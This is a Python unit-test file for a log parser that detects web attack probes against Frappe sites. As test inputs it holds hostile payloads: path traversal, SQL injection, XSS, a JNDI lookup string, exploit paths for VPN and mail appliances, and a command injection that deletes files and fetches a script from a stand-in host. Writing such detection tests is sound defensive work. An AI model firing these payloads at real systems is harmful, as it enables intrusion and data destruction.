import os
import sys
import unittest
from datetime import datetime, timezone

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from wolf_agent.parsers import nginx, web_attacks  # noqa: E402

NOW = datetime(2026, 10, 29, 2, 1, 0, tzinfo=timezone.utc)


def line(target, status=404, addr="198.51.100.7", ua="Mozilla/5.0", xff=None):
	tail = f' "{xff}"' if xff else ""
	return (
		f'{addr} - - [29/Oct/2026:03:00:13 +0100] "GET {target} HTTP/1.1" {status} 10 "-" "{ua}"{tail}'
	)


class TestClassify(unittest.TestCase):
	def test_probes(self):
		cases = {
			"/.env": "env_file",
			"/app/.env.production": "env_file",
			"/.git/config": "vcs_metadata",
			"/sites/common_site_config.json": "secret_file",
			"/backup.sql.gz": "backup_dump",
			"/wp-login.php": "cms_probe",
			"/phpmyadmin/index.php": "cms_probe",
			"/api/method/x?file=../../../../etc/passwd": "path_traversal",
			"/api/method/x?file=%252e%252e%252fetc%252fpasswd": "path_traversal",  # double encoded
			"/api/resource/User?name=1'%20OR%20'1'='1": "sql_injection",
			"/search?q=1 UNION ALL SELECT password FROM tabUser": "sql_injection",
			"/search?q=<script>alert(1)</script>": "xss",
			"/x?u=${jndi:ldap://evil/a}": "command_injection",
			"/x?cmd=;cat /etc/hosts": "command_injection",
			"/x?name={{7*7}}": "template_injection",
		}
		for target, rule in cases.items():
			with self.subTest(target):
				self.assertIn(rule, web_attacks.classify("GET", target))

	def test_normal_frappe_traffic(self):
		for target in (
			"/",
			"/app/sales-invoice/ACC-SINV-2026-00001",
			"/api/method/frappe.desk.reportview.get?doctype=Item&fields=[\"name\"]&filters=[]",
			"/assets/frappe/dist/js/desk.bundle.js",
			"/files/quarterly-report.zip",
			"/private/files/export.sql.gz",
			"/backups/20261029_020000-site-database.sql.gz",
			"/api/method/frappe.client.get_list?doctype=ToDo&order_by=modified%20desc",
			"/api/method/download?file=report.zip",
			"/app/system-console",
			"/login?redirect-to=/app",
		):
			with self.subTest(target):
				self.assertEqual(web_attacks.classify("GET", target), [])

	def test_scanner_user_agent(self):
		self.assertEqual(web_attacks.classify("GET", "/", user_agent="sqlmap/1.8#stable"), ["scanner_user_agent"])
		self.assertEqual(web_attacks.classify("GET", "/", user_agent="Mozilla/5.0 Firefox/130"), [])

	def test_exposed(self):
		self.assertTrue(web_attacks.exposed(["env_file"], 200))
		self.assertFalse(web_attacks.exposed(["env_file"], 404))
		self.assertFalse(web_attacks.exposed(["sql_injection"], 200))
		# a catch-all route answers 200 with a page, not the file
		self.assertFalse(web_attacks.exposed(["env_file"], 200, "/wolf/.env"))
		self.assertFalse(web_attacks.exposed(["vcs_metadata"], 200, "/app/.git/config"))
		self.assertTrue(web_attacks.exposed(["env_file"], 200, "/.env"))


class TestNginxProbes(unittest.TestCase):
	def parser(self):
		return nginx.NginxParser("h1", site_benches={"a.example.com": "main"}, default_site="a.example.com",
		                         default_bench="main")  # fmt: skip

	def test_aggregated_per_client(self):
		p = self.parser()
		for target in ("/.env", "/.git/config", "/wp-login.php", "/.env"):
			p.feed(line(target))
		p.feed(line("/wp-login.php", addr="203.0.113.5"))
		p.feed(line("/app/todo", status=200))
		metrics, events = p.drain(NOW)
		probes = {e["payload"]["ip"]: e for e in events if e["category"] == "web_attack_probe"}
		self.assertEqual(sorted(probes), ["198.51.100.7", "203.0.113.5"])
		e = probes["198.51.100.7"]
		self.assertEqual(e["type"], "security")
		self.assertEqual(e["severity"], "warning")
		self.assertEqual(e["site"], "a.example.com")
		self.assertEqual(e["bench"], "main")
		self.assertEqual(e["payload"]["count"], 4)
		self.assertEqual(e["payload"]["rules"], {"env_file": 2, "vcs_metadata": 1, "cms_probe": 1})
		self.assertEqual(e["payload"]["statuses"], {"404": 4})
		self.assertEqual(e["payload"]["targets"], ["/.env", "/.git/config", "/wp-login.php"])
		self.assertIn("T1552.001", e["payload"]["attack_techniques"])
		self.assertTrue(e["title"].startswith("4 web attack probe(s) from 198.51.100.7 (env_file"))
		requests = next(m for m in metrics if m["metric_name"] == "http_requests")
		self.assertEqual(requests["value"], 6)  # probes still count as requests
		self.assertEqual(p.drain(NOW)[1], [])

	def test_sensitive_file_served_is_critical(self):
		p = self.parser()
		p.feed(line("/.env", status=200))
		p.feed(line("/.git/config", status=404))
		events = {e["category"]: e for e in p.drain(NOW)[1]}
		exposed = events["web_sensitive_file_exposed"]
		self.assertEqual(exposed["severity"], "critical")
		self.assertEqual(exposed["title"], "Sensitive file served to 198.51.100.7: /.env")
		self.assertEqual(events["web_attack_probe"]["payload"]["count"], 1)

	def test_critical_threshold(self):
		p = self.parser()
		for i in range(web_attacks.CRITICAL_THRESHOLD):
			p.feed(line(f"/wp-admin/{i}.php"))
		(e,) = p.drain(NOW)[1]
		self.assertEqual(e["severity"], "critical")
		self.assertEqual(len(e["payload"]["targets"]), 10)

	def test_client_behind_local_proxy(self):
		p = self.parser()
		# the client wrote 8.8.8.8 itself; the proxy appended the real address
		p.feed(line("/.env", addr="127.0.0.1", xff="8.8.8.8, 45.33.32.156, 10.0.0.1"))
		# a public remote_addr is never replaced by a header the client controls
		p.feed(line("/.env", addr="93.184.216.34", xff="203.0.113.9"))
		ips = sorted(e["payload"]["ip"] for e in p.drain(NOW)[1])
		self.assertEqual(ips, ["45.33.32.156", "93.184.216.34"])

	def test_probe_groups_bounded(self):
		p = self.parser()
		for i in range(nginx.MAX_PROBE_GROUPS + 50):
			p.feed(line("/.env", addr=f"10.1.{i // 250}.{i % 250}"))
		self.assertEqual(len(p.drain(NOW)[1]), nginx.MAX_PROBE_GROUPS)



class TestNewProbes(unittest.TestCase):
	def test_appliances_secrets_and_scanners(self):
		cases = {
			"/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession": "appliance_probe",  # Fortinet
			"/global-protect/login.esp": "appliance_probe",
			"/dana-na/auth/url_default/welcome.cgi": "appliance_probe",  # Ivanti / Pulse
			"/vpn/../vpns/cfg/smb.conf": "appliance_probe",  # Citrix
			"/+CSCOE+/logon.html": "appliance_probe",
			"/mgmt/tm/util/bash": "appliance_probe",  # F5
			"/autodiscover/autodiscover.json?@zdi/Powershell": "appliance_probe",  # Exchange ProxyShell
			"/pages/createpage-entervariables.action": "appliance_probe",  # Confluence
			"/index.action": "appliance_probe",  # Struts
			"/geoserver/web/": "appliance_probe",
			"/.git-credentials": "secret_file",
			"/.npmrc": "secret_file",
			"/docker-compose.yml": "secret_file",
			"/.vscode/sftp.json": "secret_file",
			"/storage/logs/laravel.log": "secret_file",
		}
		for target, rule in cases.items():
			with self.subTest(target):
				self.assertIn(rule, web_attacks.classify("GET", target))
		for ua in ("Fuzz Faster U Fool v2.1.0", "Mozilla/5.0 (l9explore/1.2.2)", "dirsearch", "Katana/1.0"):
			self.assertIn("scanner_user_agent", web_attacks.classify("GET", "/", user_agent=ua), ua)

	def test_frappe_paths_and_files_are_not_probes(self):
		for target in ("/assets/frappe/css/fonts/fontawesome/svgs/brands/joomla.svg", "/files/citrix/notes.pdf",
		               "/api/v2/document/User/a@b.c", "/app/sales-invoice/new", "/api/method/frappe.client.get_list",
		               # a DocType, a web page or a query string may name an appliance
		               "/app/jenkins/JOB-0001", "/blog/jenkins/ci-setup", "/help/geoserver/install", "/kb/web.config",
		               "/docs/debug/pprof", "/login?redirect-to=/app/citrix/", "/callback?return=https://ci/jenkins/job/x"):  # fmt: skip
			self.assertEqual(web_attacks.classify("GET", target, 200), [], target)
		for target in ("/web.config/", "/.env/", "/docker-compose.prod.yml", "/compose.yaml", "/config/secrets.json", "/.aws/config"):
			self.assertTrue(web_attacks.classify("GET", target), target)
		self.assertIn("command_injection", web_attacks.classify("GET", "/shell?cd+/tmp;rm+-rf+*;wget+http://x/a.sh"))

	def test_frappe_rules(self):
		reset = "/api/method/frappe.core.doctype.user.user.reset_password"
		self.assertEqual(web_attacks.classify("POST", reset, 200), ["frappe_auth_abuse"])
		self.assertEqual(web_attacks.classify("POST", "/api/method/frappe.integrations.oauth2.get_token", 401), ["frappe_auth_abuse"])
		self.assertEqual(web_attacks.classify("POST", "/api/method/frappe.client.insert", 403), ["frappe_api_forbidden"])
		self.assertEqual(web_attacks.classify("POST", "/api/method/frappe.client.insert", 200), [])
		self.assertEqual(web_attacks.classify("GET", "/api/resource/User", 403), ["frappe_api_forbidden"])
		self.assertEqual(web_attacks.classify("GET", "/api/resource/User", 401), [], "401 is also an expired session")
		self.assertEqual(web_attacks.classify("POST", "/api/v2/method/frappe.core.doctype.user.user.reset_password"),
		                 ["frappe_auth_abuse"])  # fmt: skip


class TestFrappeRates(unittest.TestCase):
	def parser(self):
		return nginx.NginxParser("h1", site_benches={"a.example.com": "main"}, default_site="a.example.com",
		                         default_bench="main")  # fmt: skip

	def probes(self, p):
		return [e for e in p.drain(NOW)[1] if e["category"] == "web_attack_probe"]

	def test_one_reset_or_a_stale_tab_is_not_a_probe(self):
		p = self.parser()
		p.feed(line("/api/method/frappe.core.doctype.user.user.reset_password", status=200))
		for _ in range(5):
			p.feed(line("/api/method/frappe.desk.form.load.getdoc?doctype=User&name=x", status=403, addr="203.0.113.9"))
		self.assertEqual(self.probes(p), [])

	def test_a_burst_is(self):
		p = self.parser()
		for i in range(12):  # enumerating accounts through the password reset
			p.feed(line(f"/api/method/frappe.core.doctype.user.user.reset_password?user=u{i}@example.com", status=200))
		for i in range(25):  # trying methods without the right to
			p.feed(line(f"/api/method/frappe.client.method_{i % 6}?doctype=User", status=403, addr="203.0.113.9"))
		got = {e["payload"]["ip"]: e["payload"]["rules"] for e in self.probes(p)}
		self.assertEqual(got, {"198.51.100.7": {"frappe_auth_abuse": 12}, "203.0.113.9": {"frappe_api_forbidden": 25}})
		(ev,) = [e for e in self.parser_events_with_techniques()]
		self.assertEqual(ev, ["T1110"])

	def parser_events_with_techniques(self):
		p = self.parser()
		for i in range(10):
			p.feed(line(f"/api/method/frappe.integrations.oauth2.get_token?n={i}", status=401))
		return [e["payload"]["attack_techniques"] for e in self.probes(p)]

	def test_next_to_other_probes_it_joins_them(self):
		p = self.parser()
		p.feed(line("/.env"))
		p.feed(line("/api/method/frappe.core.doctype.user.user.reset_password", status=200))
		(ev,) = self.probes(p)
		self.assertEqual(ev["payload"]["rules"], {"env_file": 1, "frappe_auth_abuse": 1})

	def test_thresholds(self):
		for calls, expected in ((9, 0), (10, 1)):
			p = self.parser()
			for i in range(calls):
				p.feed(line(f"/api/v2/method/frappe.core.doctype.user.user.reset_password?u={i}", status=200))
			self.assertEqual(len(self.probes(p)), expected, calls)
		for calls, methods, expected in ((19, 6, 0), (20, 6, 1), (40, 1, 0)):  # one polled resource is not a storm
			p = self.parser()
			for i in range(calls):
				p.feed(line(f"/api/method/m{i % methods}", status=403))
			self.assertEqual(len(self.probes(p)), expected, (calls, methods))

	def test_a_burst_across_two_minutes(self):
		p = self.parser()
		reset = "/api/method/frappe.core.doctype.user.user.reset_password"
		for i in range(6):
			p.feed(line(f"{reset}?u={i}", status=200).replace("03:00:13", "03:00:50"))
		self.assertEqual(self.probes(p), [], "6 so far")
		for i in range(6):
			p.feed(line(f"{reset}?u=b{i}", status=200).replace("03:00:13", "03:01:05"))
		(ev,) = self.probes(p)
		self.assertEqual(ev["payload"]["rules"], {"frappe_auth_abuse": 12}, "the window spans the minute boundary")

	def test_session_expiry_and_refresh_tokens_are_not_abuse(self):
		p = self.parser()
		for i in range(30):  # a deploy flushed the sessions of an office behind one NAT
			p.feed(line(f"/api/method/frappe.desk.method_{i % 8}", status=401))
		for _ in range(15):
			p.feed(line("/api/method/frappe.integrations.oauth2.get_token?grant_type=refresh_token", status=200))
		self.assertEqual(self.probes(p), [])

if __name__ == "__main__":
	unittest.main()
